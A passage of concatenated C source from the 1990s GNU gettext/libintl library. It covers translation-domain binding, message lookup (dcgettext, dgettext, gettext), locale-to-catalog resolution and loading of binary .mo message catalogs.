      /* We have to create a new binding.  */
      size_t len;
      struct binding *new_binding =
	(struct binding *) malloc (sizeof (*new_binding));

      if (new_binding == NULL)
	return NULL;

      len = strlen (domainname) + 1;
      new_binding->domainname = (char *) malloc (len);
      if (new_binding->domainname == NULL)
	  return NULL;
      memcpy (new_binding->domainname, domainname, len);

      if (strcmp (dirname, _nl_default_dirname) == 0)
	new_binding->dirname = (char *) _nl_default_dirname;
      else
	{
	  len = strlen (dirname) + 1;
	  new_binding->dirname = (char *) malloc (len);
	  if (new_binding->dirname == NULL)
	    return NULL;
	  memcpy (new_binding->dirname, dirname, len);
	}

      /* Now enqueue it.  */
      if (_nl_domain_bindings == NULL
	  || strcmp (domainname, _nl_domain_bindings->domainname) < 0)
	{
	  new_binding->next = _nl_domain_bindings;
	  _nl_domain_bindings = new_binding;
	}
      else
	{
	  binding = _nl_domain_bindings;
	  while (binding->next != NULL
		 && strcmp (domainname, binding->next->domainname) > 0)
	    binding = binding->next;

	  new_binding->next = binding->next;
	  binding->next = new_binding;
	}

      binding = new_binding;
    }

  return binding->dirname;
}

#ifdef _LIBC
/* Alias for function name in GNU C Library.  */
weak_alias (__bindtextdomain, bindtextdomain);
#endif
/* dcgettext.c -- implementation of the dcgettext(3) function
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <sys/types.h>

#ifdef __GNUC__
# define alloca __builtin_alloca
# define HAVE_ALLOCA 1
#else
# if defined HAVE_ALLOCA_H || defined _LIBC
#  include <alloca.h>
# else
#  ifdef _AIX
 #pragma alloca
#  else
#   ifndef alloca
char *alloca ();
#   endif
#  endif
# endif
#endif

#include <errno.h>
#ifndef errno
extern int errno;
#endif

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#else
char *getenv ();
# ifdef HAVE_MALLOC_H
#  include <malloc.h>
# else
void free ();
# endif
#endif

#if defined HAVE_STRING_H || defined _LIBC
# ifndef _GNU_SOURCE
#  define _GNU_SOURCE	1
# endif
# include <string.h>
#else
# include <strings.h>
#endif
#if !HAVE_STRCHR && !defined _LIBC
# ifndef strchr
#  define strchr index
# endif
#endif

#if defined HAVE_UNISTD_H || defined _LIBC
# include <unistd.h>
#endif

#include "gettext.h"
#include "gettextP.h"
#ifdef _LIBC
# include <libintl.h>
#else
# include "libgettext.h"
#endif
#include "hash-string.h"

/* @@ end of prolog @@ */

#ifdef _LIBC
/* Rename the non ANSI C functions.  This is required by the standard
   because some ANSI C functions will require linking with this object
   file and the name space must not be polluted.  */
# define getcwd __getcwd
# define stpcpy __stpcpy
#else
# if !defined HAVE_GETCWD
char *getwd ();
#  define getcwd(buf, max) getwd (buf)
# else
char *getcwd ();
# endif
# ifndef HAVE_STPCPY
static char *stpcpy PARAMS ((char *dest, const char *src));
# endif
#endif

/* Amount to increase buffer size by in each try.  */
#define PATH_INCR 32

/* The following is from pathmax.h.  */
/* Non-POSIX BSD systems might have gcc's limits.h, which doesn't define
   PATH_MAX but might cause redefinition warnings when sys/param.h is
   later included (as on MORE/BSD 4.3).  */
#if defined(_POSIX_VERSION) || (defined(HAVE_LIMITS_H) && !defined(__GNUC__))
# include <limits.h>
#endif

#ifndef _POSIX_PATH_MAX
# define _POSIX_PATH_MAX 255
#endif

#if !defined(PATH_MAX) && defined(_PC_PATH_MAX)
# define PATH_MAX (pathconf ("/", _PC_PATH_MAX) < 1 ? 1024 : pathconf ("/", _PC_PATH_MAX))
#endif

/* Don't include sys/param.h if it already has been.  */
#if defined(HAVE_SYS_PARAM_H) && !defined(PATH_MAX) && !defined(MAXPATHLEN)
# include <sys/param.h>
#endif

#if !defined(PATH_MAX) && defined(MAXPATHLEN)
# define PATH_MAX MAXPATHLEN
#endif

#ifndef PATH_MAX
# define PATH_MAX _POSIX_PATH_MAX
#endif

/* XPG3 defines the result of `setlocale (category, NULL)' as:
   ``Directs `setlocale()' to query `category' and return the current
     setting of `local'.''
   However it does not specify the exact format.  And even worse: POSIX
   defines this not at all.  So we can use this feature only on selected
   system (e.g. those using GNU C Library).  */
#ifdef _LIBC
# define HAVE_LOCALE_NULL
#endif

/* Name of the default domain used for gettext(3) prior any call to
   textdomain(3).  The default value for this is "messages".  */
const char _nl_default_default_domain[] = "messages";

/* Value used as the default domain for gettext(3).  */
const char *_nl_current_default_domain = _nl_default_default_domain;

/* Contains the default location of the message catalogs.  */
const char _nl_default_dirname[] = GNULOCALEDIR;

/* List with bindings of specific domains created by bindtextdomain()
   calls.  */
struct binding *_nl_domain_bindings;

/* Prototypes for local functions.  */
static char *find_msg PARAMS ((struct loaded_l10nfile *domain_file,
			       const char *msgid));
static const char *category_to_name PARAMS ((int category));
static const char *guess_category_value PARAMS ((int category,
						 const char *categoryname));


/* For those loosing systems which don't have `alloca' we have to add
   some additional code emulating it.  */
#ifdef HAVE_ALLOCA
/* Nothing has to be done.  */
# define ADD_BLOCK(list, address) /* nothing */
# define FREE_BLOCKS(list) /* nothing */
#else
struct block_list
{
  void *address;
  struct block_list *next;
};
# define ADD_BLOCK(list, addr)						      \
  do {									      \
    struct block_list *newp = (struct block_list *) malloc (sizeof (*newp));  \
    /* If we cannot get a free block we cannot add the new element to	      \
       the list.  */							      \
    if (newp != NULL) {							      \
      newp->address = (addr);						      \
      newp->next = (list);						      \
      (list) = newp;							      \
    }									      \
  } while (0)
# define FREE_BLOCKS(list)						      \
  do {									      \
    while (list != NULL) {						      \
      struct block_list *old = list;					      \
      list = list->next;						      \
      free (old);							      \
    }									      \
  } while (0)
# undef alloca
# define alloca(size) (malloc (size))
#endif	/* have alloca */


/* Names for the libintl functions are a problem.  They must not clash
   with existing names and they should follow ANSI C.  But this source
   code is also used in GNU C Library where the names have a __
   prefix.  So we have to make a difference here.  */
#ifdef _LIBC
# define DCGETTEXT __dcgettext
#else
# define DCGETTEXT dcgettext__
#endif

/* Look up MSGID in the DOMAINNAME message catalog for the current CATEGORY
   locale.  */
char *
DCGETTEXT (domainname, msgid, category)
     const char *domainname;
     const char *msgid;
     int category;
{
#ifndef HAVE_ALLOCA
  struct block_list *block_list = NULL;
#endif
  struct loaded_l10nfile *domain;
  struct binding *binding;
  const char *categoryname;
  const char *categoryvalue;
  char *dirname, *xdomainname;
  char *single_locale;
  char *retval;
  int saved_errno = errno;

  /* If no real MSGID is given return NULL.  */
  if (msgid == NULL)
    return NULL;

  /* If DOMAINNAME is NULL, we are interested in the default domain.  If
     CATEGORY is not LC_MESSAGES this might not make much sense but the
     defintion left this undefined.  */
  if (domainname == NULL)
    domainname = _nl_current_default_domain;

  /* First find matching binding.  */
  for (binding = _nl_domain_bindings; binding != NULL; binding = binding->next)
    {
      int compare = strcmp (domainname, binding->domainname);
      if (compare == 0)
	/* We found it!  */
	break;
      if (compare < 0)
	{
	  /* It is not in the list.  */
	  binding = NULL;
	  break;
	}
    }

  if (binding == NULL)
    dirname = (char *) _nl_default_dirname;
  else if (binding->dirname[0] == '/')
    dirname = binding->dirname;
  else
    {
      /* We have a relative path.  Make it absolute now.  */
      size_t dirname_len = strlen (binding->dirname) + 1;
      size_t path_max;
      char *ret;

      path_max = (unsigned) PATH_MAX;
      path_max += 2;		/* The getcwd docs say to do this.  */

      dirname = (char *) alloca (path_max + dirname_len);
      ADD_BLOCK (block_list, dirname);

      errno = 0;
      while ((ret = getcwd (dirname, path_max)) == NULL && errno == ERANGE)
	{
	  path_max += PATH_INCR;
	  dirname = (char *) alloca (path_max + dirname_len);
	  ADD_BLOCK (block_list, dirname);
	  errno = 0;
	}

      if (ret == NULL)
	{
	  /* We cannot get the current working directory.  Don't signal an
	     error but simply return the default string.  */
	  FREE_BLOCKS (block_list);
	  errno = saved_errno;
	  return (char *) msgid;
	}

      /* We don't want libintl.a to depend on any other library.  So
	 we avoid the non-standard function stpcpy.  In GNU C Library
	 this function is available, though.  Also allow the symbol
	 HAVE_STPCPY to be defined.  */
      stpcpy (stpcpy (strchr (dirname, '\0'), "/"), binding->dirname);
    }

  /* Now determine the symbolic name of CATEGORY and its value.  */
  categoryname = category_to_name (category);
  categoryvalue = guess_category_value (category, categoryname);

  xdomainname = (char *) alloca (strlen (categoryname)
				 + strlen (domainname) + 5);
  ADD_BLOCK (block_list, xdomainname);
  /* We don't want libintl.a to depend on any other library.  So we
     avoid the non-standard function stpcpy.  In GNU C Library this
     function is available, though.  Also allow the symbol HAVE_STPCPY
     to be defined.  */
  stpcpy (stpcpy (stpcpy (stpcpy (xdomainname, categoryname), "/"),
		  domainname),
	  ".mo");

  /* Creating working area.  */
  single_locale = (char *) alloca (strlen (categoryvalue) + 1);
  ADD_BLOCK (block_list, single_locale);


  /* Search for the given string.  This is a loop because we perhaps
     got an ordered list of languages to consider for th translation.  */
  while (1)
    {
      /* Make CATEGORYVALUE point to the next element of the list.  */
      while (categoryvalue[0] != '\0' && categoryvalue[0] == ':')
	++categoryvalue;
      if (categoryvalue[0] == '\0')
	{
	  /* The whole contents of CATEGORYVALUE has been searched but
	     no valid entry has been found.  We solve this situation
	     by implicitely appending a "C" entry, i.e. no translation
	     will take place.  */
	  single_locale[0] = 'C';
	  single_locale[1] = '\0';
	}
      else
	{
	  char *cp = single_locale;
	  while (categoryvalue[0] != '\0' && categoryvalue[0] != ':')
	    *cp++ = *categoryvalue++;
	  *cp = '\0';
	}

      /* If the current locale value is C (or POSIX) we don't load a
	 domain.  Return the MSGID.  */
      if (strcmp (single_locale, "C") == 0
	  || strcmp (single_locale, "POSIX") == 0)
	{
	  FREE_BLOCKS (block_list);
	  errno = saved_errno;
	  return (char *) msgid;
	}


      /* Find structure describing the message catalog matching the
	 DOMAINNAME and CATEGORY.  */
      domain = _nl_find_domain (dirname, single_locale, xdomainname);

      if (domain != NULL)
	{
	  retval = find_msg (domain, msgid);

	  if (retval == NULL)
	    {
	      int cnt;

	      for (cnt = 0; domain->successor[cnt] != NULL; ++cnt)
		{
		  retval = find_msg (domain->successor[cnt], msgid);

		  if (retval != NULL)
		    break;
		}
	    }

	  if (retval != NULL)
	    {
	      FREE_BLOCKS (block_list);
	      errno = saved_errno;
	      return retval;
	    }
	}
    }
  /* NOTREACHED */
}

#ifdef _LIBC
/* Alias for function name in GNU C Library.  */
weak_alias (__dcgettext, dcgettext);
#endif


static char *
find_msg (domain_file, msgid)
     struct loaded_l10nfile *domain_file;
     const char *msgid;
{
  size_t top, act, bottom;
  struct loaded_domain *domain;

  if (domain_file->decided == 0)
    _nl_load_domain (domain_file);

  if (domain_file->data == NULL)
    return NULL;

  domain = (struct loaded_domain *) domain_file->data;

  /* Locate the MSGID and its translation.  */
  if (domain->hash_size > 2 && domain->hash_tab != NULL)
    {
      /* Use the hashing table.  */
      nls_uint32 len = strlen (msgid);
      nls_uint32 hash_val = hash_string (msgid);
      nls_uint32 idx = hash_val % domain->hash_size;
      nls_uint32 incr = 1 + (hash_val % (domain->hash_size - 2));
      nls_uint32 nstr = W (domain->must_swap, domain->hash_tab[idx]);

      if (nstr == 0)
	/* Hash table entry is empty.  */
	return NULL;

      if (W (domain->must_swap, domain->orig_tab[nstr - 1].length) == len
	  && strcmp (msgid,
		     domain->data + W (domain->must_swap,
				       domain->orig_tab[nstr - 1].offset)) == 0)
	return (char *) domain->data + W (domain->must_swap,
					  domain->trans_tab[nstr - 1].offset);

      while (1)
	{
	  if (idx >= domain->hash_size - incr)
	    idx -= domain->hash_size - incr;
	  else
	    idx += incr;

	  nstr = W (domain->must_swap, domain->hash_tab[idx]);
	  if (nstr == 0)
	    /* Hash table entry is empty.  */
	    return NULL;

	  if (W (domain->must_swap, domain->orig_tab[nstr - 1].length) == len
	      && strcmp (msgid,
			 domain->data + W (domain->must_swap,
					   domain->orig_tab[nstr - 1].offset))
	         == 0)
	    return (char *) domain->data
	      + W (domain->must_swap, domain->trans_tab[nstr - 1].offset);
	}
      /* NOTREACHED */
    }

  /* Now we try the default method:  binary search in the sorted
     array of messages.  */
  bottom = 0;
  top = domain->nstrings;
  while (bottom < top)
    {
      int cmp_val;

      act = (bottom + top) / 2;
      cmp_val = strcmp (msgid, domain->data
			       + W (domain->must_swap,
				    domain->orig_tab[act].offset));
      if (cmp_val < 0)
	top = act;
      else if (cmp_val > 0)
	bottom = act + 1;
      else
	break;
    }

  /* If an translation is found return this.  */
  return bottom >= top ? NULL : (char *) domain->data
                                + W (domain->must_swap,
				     domain->trans_tab[act].offset);
}


/* Return string representation of locale CATEGORY.  */
static const char *
category_to_name (category)
     int category;
{
  const char *retval;

  switch (category)
  {
#ifdef LC_COLLATE
  case LC_COLLATE:
    retval = "LC_COLLATE";
    break;
#endif
#ifdef LC_CTYPE
  case LC_CTYPE:
    retval = "LC_CTYPE";
    break;
#endif
#ifdef LC_MONETARY
  case LC_MONETARY:
    retval = "LC_MONETARY";
    break;
#endif
#ifdef LC_NUMERIC
  case LC_NUMERIC:
    retval = "LC_NUMERIC";
    break;
#endif
#ifdef LC_TIME
  case LC_TIME:
    retval = "LC_TIME";
    break;
#endif
#ifdef LC_MESSAGES
  case LC_MESSAGES:
    retval = "LC_MESSAGES";
    break;
#endif
#ifdef LC_RESPONSE
  case LC_RESPONSE:
    retval = "LC_RESPONSE";
    break;
#endif
#ifdef LC_ALL
  case LC_ALL:
    /* This might not make sense but is perhaps better than any other
       value.  */
    retval = "LC_ALL";
    break;
#endif
  default:
    /* If you have a better idea for a default value let me know.  */
    retval = "LC_XXX";
  }

  return retval;
}

/* Guess value of current locale from value of the environment variables.  */
static const char *guess_category_value (category, categoryname)
     int category;
     const char *categoryname;
{
  const char *retval;

  /* The highest priority value is the `LANGUAGE' environment
     variable.  This is a GNU extension.  */
  retval = getenv ("LANGUAGE");
  if (retval != NULL && retval[0] != '\0')
    return retval;

  /* `LANGUAGE' is not set.  So we have to proceed with the POSIX
     methods of looking to `LC_ALL', `LC_xxx', and `LANG'.  On some
     systems this can be done by the `setlocale' function itself.  */
#if defined HAVE_SETLOCALE && defined HAVE_LC_MESSAGES && defined HAVE_LOCALE_NULL
  return setlocale (category, NULL);
#else
  /* Setting of LC_ALL overwrites all other.  */
  retval = getenv ("LC_ALL");
  if (retval != NULL && retval[0] != '\0')
    return retval;

  /* Next comes the name of the desired category.  */
  retval = getenv (categoryname);
  if (retval != NULL && retval[0] != '\0')
    return retval;

  /* Last possibility is the LANG environment variable.  */
  retval = getenv ("LANG");
  if (retval != NULL && retval[0] != '\0')
    return retval;

  /* We use C as the default domain.  POSIX says this is implementation
     defined.  */
  return "C";
#endif
}

/* @@ begin of epilog @@ */

/* We don't want libintl.a to depend on any other library.  So we
   avoid the non-standard function stpcpy.  In GNU C Library this
   function is available, though.  Also allow the symbol HAVE_STPCPY
   to be defined.  */
#if !_LIBC && !HAVE_STPCPY
static char *
stpcpy (dest, src)
     char *dest;
     const char *src;
{
  while ((*dest++ = *src++) != '\0')
    /* Do nothing. */ ;
  return dest - 1;
}
#endif
/* dgettext.c -- implementation of the dgettext(3) function
   Copyright (C) 1995 Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#if defined HAVE_LOCALE_H || defined _LIBC
# include <locale.h>
#endif

#ifdef _LIBC
# include <libintl.h>
#else
# include "libgettext.h"
#endif

/* @@ end of prolog @@ */

/* Names for the libintl functions are a problem.  They must not clash
   with existing names and they should follow ANSI C.  But this source
   code is also used in GNU C Library where the names have a __
   prefix.  So we have to make a difference here.  */
#ifdef _LIBC
# define DGETTEXT __dgettext
# define DCGETTEXT __dcgettext
#else
# define DGETTEXT dgettext__
# define DCGETTEXT dcgettext__
#endif

/* Look up MSGID in the DOMAINNAME message catalog of the current
   LC_MESSAGES locale.  */
char *
DGETTEXT (domainname, msgid)
     const char *domainname;
     const char *msgid;
{
  return DCGETTEXT (domainname, msgid, LC_MESSAGES);
}

#ifdef _LIBC
/* Alias for function name in GNU C Library.  */
weak_alias (__dgettext, dgettext);
#endif
/* gettext.c -- implementation of gettext(3) function
   Copyright (C) 1995 Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#ifdef _LIBC
# define __need_NULL
# include <stddef.h>
#else
# ifdef STDC_HEADERS
#  include <stdlib.h>		/* Just for NULL.  */
# else
#  ifdef HAVE_STRING_H
#   include <string.h>
#  else
#   define NULL ((void *) 0)
#  endif
# endif
#endif

#ifdef _LIBC
# include <libintl.h>
#else
# include "libgettext.h"
#endif

/* @@ end of prolog @@ */

/* Names for the libintl functions are a problem.  They must not clash
   with existing names and they should follow ANSI C.  But this source
   code is also used in GNU C Library where the names have a __
   prefix.  So we have to make a difference here.  */
#ifdef _LIBC
# define GETTEXT __gettext
# define DGETTEXT __dgettext
#else
# define GETTEXT gettext__
# define DGETTEXT dgettext__
#endif

/* Look up MSGID in the current default message catalog for the current
   LC_MESSAGES locale.  If not found, returns MSGID itself (the default
   text).  */
char *
GETTEXT (msgid)
     const char *msgid;
{
  return DGETTEXT (NULL, msgid);
}

#ifdef _LIBC
/* Alias for function name in GNU C Library.  */
weak_alias (__gettext, gettext);
#endif
/* finddomain.c -- handle list of needed message catalogs
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.
   Written by Ulrich Drepper <drepper@gnu.ai.mit.edu>, 1995.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <ctype.h>
#include <errno.h>
#include <stdio.h>
#include <sys/types.h>

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#else
# ifdef HAVE_MALLOC_H
#  include <malloc.h>
# else
void free ();
# endif
#endif

#if defined HAVE_STRING_H || defined _LIBC
# include <string.h>
#else
# include <strings.h>
#endif
#if !HAVE_STRCHR && !defined _LIBC
# ifndef strchr
#  define strchr index
# endif
#endif

#if defined HAVE_UNISTD_H || defined _LIBC
# include <unistd.h>
#endif

#include "gettext.h"
#include "gettextP.h"
#ifdef _LIBC
# include <libintl.h>
#else
# include "libgettext.h"
#endif

/* @@ end of prolog @@ */

#ifdef _LIBC
/* Rename the non ANSI C functions.  This is required by the standard
   because some ANSI C functions will require linking with this object
   file and the name space must not be polluted.  */
# define stpcpy(dest, src) __stpcpy(dest, src)
#else
# ifndef HAVE_STPCPY
static char *stpcpy PARAMS ((char *dest, const char *src));
# endif
#endif

/* List of already loaded domains.  */
static struct loaded_l10nfile *_nl_loaded_domains;


/* Return a data structure describing the message catalog described by
   the DOMAINNAME and CATEGORY parameters with respect to the currently
   established bindings.  */
struct loaded_l10nfile *
_nl_find_domain (dirname, locale, domainname)
     const char *dirname;
     char *locale;
     const char *domainname;
{
  struct loaded_l10nfile *retval;
  const char *language;
  const char *modifier;
  const char *territory;
  const char *codeset;
  const char *normalized_codeset;
  const char *special;
  const char *sponsor;
  const char *revision;
  const char *alias_value;
  int mask;

  /* LOCALE can consist of up to four recognized parts for the XPG syntax:

		language[_territory[.codeset]][@modifier]

     and six parts for the CEN syntax:

	language[_territory][+audience][+special][,sponsor][_revision]

     Beside the first all of them are allowed to be missing.  If the
     full specified locale is not found, the less specific one are
     looked for.  The various part will be stripped of according to
     the following order:
		(1) revision
		(2) sponsor
		(3) special
		(4) codeset
		(5) normalized codeset
		(6) territory
		(7) audience/modifier
   */

  /* If we have already tested for this locale entry there has to
     be one data set in the list of loaded domains.  */
  retval = _nl_make_l10nflist (&_nl_loaded_domains, dirname,
			       strlen (dirname) + 1, 0, locale, NULL, NULL,
			       NULL, NULL, NULL, NULL, NULL, domainname, 0);
  if (retval != NULL)
    {
      /* We know something about this locale.  */
      int cnt;

      if (retval->decided == 0)
	_nl_load_domain (retval);

      if (retval->data != NULL)
	return retval;

      for (cnt = 0; retval->successor[cnt] != NULL; ++cnt)
	{
	  if (retval->successor[cnt]->decided == 0)
	    _nl_load_domain (retval->successor[cnt]);

	  if (retval->successor[cnt]->data != NULL)
	    break;
	}
      return cnt >= 0 ? retval : NULL;
      /* NOTREACHED */
    }

  /* See whether the locale value is an alias.  If yes its value
     *overwrites* the alias name.  No test for the original value is
     done.  */
  alias_value = _nl_expand_alias (locale);
  if (alias_value != NULL)
    {
      size_t len = strlen (alias_value) + 1;
      locale = (char *) malloc (len);
      if (locale == NULL)
	return NULL;

      memcpy (locale, alias_value, len);
    }

  /* Now we determine the single parts of the locale name.  First
     look for the language.  Termination symbols are `_' and `@' if
     we use XPG4 style, and `_', `+', and `,' if we use CEN syntax.  */
  mask = _nl_explode_name (locale, &language, &modifier, &territory,
			   &codeset, &normalized_codeset, &special,
			   &sponsor, &revision);

  /* Create all possible locale entries which might be interested in
     generalzation.  */
  retval = _nl_make_l10nflist (&_nl_loaded_domains, dirname,
			       strlen (dirname) + 1, mask, language, territory,
			       codeset, normalized_codeset, modifier, special,
			       sponsor, revision, domainname, 1);
  if (retval == NULL)
    /* This means we are out of core.  */
    return NULL;

  if (retval->decided == 0)
    _nl_load_domain (retval);
  if (retval->data == NULL)
    {
      int cnt;
      for (cnt = 0; retval->successor[cnt] != NULL; ++cnt)
	{
	  if (retval->successor[cnt]->decided == 0)
	    _nl_load_domain (retval->successor[cnt]);
	  if (retval->successor[cnt]->data != NULL)
	    break;
	}
    }

  /* The room for an alias was dynamically allocated.  Free it now.  */
  if (alias_value != NULL)
    free (locale);

  return retval;
}

/* @@ begin of epilog @@ */

/* We don't want libintl.a to depend on any other library.  So we
   avoid the non-standard function stpcpy.  In GNU C Library this
   function is available, though.  Also allow the symbol HAVE_STPCPY
   to be defined.  */
#if !_LIBC && !HAVE_STPCPY
static char *
stpcpy (dest, src)
     char *dest;
     const char *src;
{
  while ((*dest++ = *src++) != '\0')
    /* Do nothing. */ ;
  return dest - 1;
}
#endif
/* loadmsgcat.c -- load needed message catalogs
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#endif

#if defined HAVE_UNISTD_H || defined _LIBC
# include <unistd.h>
#endif

#if (defined HAVE_MMAP && defined HAVE_MUNMAP) || defined _LIBC
# include <sys/mman.h>
#endif

#include "gettext.h"
#include "gettextP.h"

/* @@ end of prolog @@ */

#ifdef _LIBC
/* Rename the non ANSI C functions.  This is required by the standard
   because some ANSI C functions will require linking with this object
   file and the name space must not be polluted.  */
# define fstat  __fstat
# define open   __open
# define close  __close
# define read   __read
# define mmap   __mmap
# define munmap __munmap
#endif

/* We need a sign, whether a new catalog was loaded, which can be associated
   with all translations.  This is important if the translations are
   cached by one of GCC's features.  */
int _nl_msg_cat_cntr;


/* Load the message catalogs specified by FILENAME.  If it is no valid
   message catalog do nothing.  */
void
_nl_load_domain (domain_file)
     struct loaded_l10nfile *domain_file;
{
  int fd;
  struct stat st;
  struct mo_file_header *data = (struct mo_file_header *) -1;
#if (defined HAVE_MMAP && defined HAVE_MUNMAP && !defined DISALLOW_MMAP) \
    || defined _LIBC
  int use_mmap = 0;
#endif
  struct loaded_domain *domain;

  domain_file->decided = 1;
  domain_file->data = NULL;

  /* If the record does not represent a valid locale the FILENAME
     might be NULL.  This can happen when according to the given
     specification the locale file name is different for XPG and CEN
     syntax.  */
  if (domain_file->filename == NULL)
    return;

  /* Try to open the addressed file.  */
  fd = open (domain_file->filename, O_RDONLY);
  if (fd == -1)
    return;

  /* We must know about the size of the file.  */
  if (fstat (fd, &st) != 0
      && st.st_size < (off_t) sizeof (struct mo_file_header))
    {
      /* Something went wrong.  */
      close (fd);
      return;
    }

#if (defined HAVE_MMAP && defined HAVE_MUNMAP && !defined DISALLOW_MMAP) \
    || defined _LIBC
  /* Now we are ready to load the file.  If mmap() is available we try
     this first.  If not available or it failed we try to load it.  */
  data = (struct mo_file_header *) mmap (NULL, st.st_size, PROT_READ,
					 MAP_PRIVATE, fd, 0);

  if (data != (struct mo_file_header *) -1)
    {
      /* mmap() call was successful.  */
      close (fd);
      use_mmap = 1;
    }
#endif

  /* If the data is not yet available (i.e. mmap'ed) we try to load
     it manually.  */
  if (data == (struct mo_file_header *) -1)
    {
      off_t to_read;
      char *read_ptr;

      data = (struct mo_file_header *) malloc (st.st_size);
      if (data == NULL)
	return;

      to_read = st.st_size;
      read_ptr = (char *) data;
      do
	{
	  long int nb = (long int) read (fd, read_ptr, to_read);
	  if (nb == -1)
	    {
	      close (fd);
	      return;
	    }

	  read_ptr += nb;
	  to_read -= nb;
	}
      while (to_read > 0);

      close (fd);
    }

  /* Using the magic number we can test whether it really is a message
     catalog file.  */
  if (data->magic != _MAGIC && data->magic != _MAGIC_SWAPPED)
    {
      /* The magic number is wrong: not a message catalog file.  */
#if (defined HAVE_MMAP && defined HAVE_MUNMAP && !defined DISALLOW_MMAP) \
    || defined _LIBC
      if (use_mmap)
	munmap ((caddr_t) data, st.st_size);
      else
#endif
	free (data);
      return;
    }

  domain_file->data
    = (struct loaded_domain *) malloc (sizeof (struct loaded_domain));
  if (domain_file->data == NULL)
    return;

  domain = (struct loaded_domain *) domain_file->data;
  domain->data = (char *) data;
  domain->must_swap = data->magic != _MAGIC;

  /* Fill in the information about the available tables.  */
  switch (W (domain->must_swap, data->revision))
    {
    case 0:
      domain->nstrings = W (domain->must_swap, data->nstrings);
      domain->orig_tab = (struct string_desc *)
	((char *) data + W (domain->must_swap, data->orig_tab_offset));
      domain->trans_tab = (struct string_desc *)
	((char *) data + W (domain->must_swap, data->trans_tab_offset));
      domain->hash_size = W (domain->must_swap, data->hash_tab_size);
      domain->hash_tab = (nls_uint32 *)
	((char *) data + W (domain->must_swap, data->hash_tab_offset));
      break;
    default:
      /* This is an illegal revision.  */
#if (defined HAVE_MMAP && defined HAVE_MUNMAP && !defined DISALLOW_MMAP) \
    || defined _LIBC
      if (use_mmap)
	munmap ((caddr_t) data, st.st_size);
      else
#endif
	free (data);
      free (domain);
      domain_file->data = NULL;
      return;
    }

  /* Show that one domain is changed.  This might make some cached
     translations invalid.  */
  ++_nl_msg_cat_cntr;
}
/* localealias.c -- handle aliases for locale names
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <ctype.h>
#include <stdio.h>
#include <sys/types.h>

#ifdef __GNUC__
# define alloca __builtin_alloca
# define HAVE_ALLOCA 1
#else
# if defined HAVE_ALLOCA_H || defined _LIBC
#  include <alloca.h>
# else
#  ifdef _AIX
 #pragma alloca
#  else
#   ifndef alloca
char *alloca ();
#   endif
#  endif
# endif
#endif

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#else
char *getenv ();
# ifdef HAVE_MALLOC_H
#  include <malloc.h>
# else
void free ();
# endif
#endif

#if defined HAVE_STRING_H || defined _LIBC
# ifndef _GNU_SOURCE
#  define _GNU_SOURCE	1
# endif
# include <string.h>
#else
# include <strings.h>
#endif
#if !HAVE_STRCHR && !defined _LIBC
# ifndef strchr
#  define strchr index
# endif
#endif

#include "gettext.h"
#include "gettextP.h"

/* @@ end of prolog @@ */

